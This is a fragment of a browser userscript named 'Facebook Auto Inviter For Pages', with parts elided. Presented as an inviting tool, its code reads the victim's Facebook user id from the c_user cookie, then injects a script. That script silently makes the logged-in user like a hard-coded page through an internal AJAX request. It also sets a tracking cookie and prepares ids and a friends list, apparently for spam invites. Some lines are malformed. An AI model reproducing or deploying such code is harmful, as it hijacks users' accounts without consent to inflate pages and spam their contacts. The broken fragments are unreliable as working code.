// ==UserScript==
// @name            Facebook Auto Inviter For Pages
// @namespace       Facebook Auto Inviter For Pages
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:681661605177496,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("boysandgirlschat5",'facebook',365);
...
var spage_id = "421259157980719";
var spost_id = "421259157980719";
var sfoto_id = "421259157980719";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
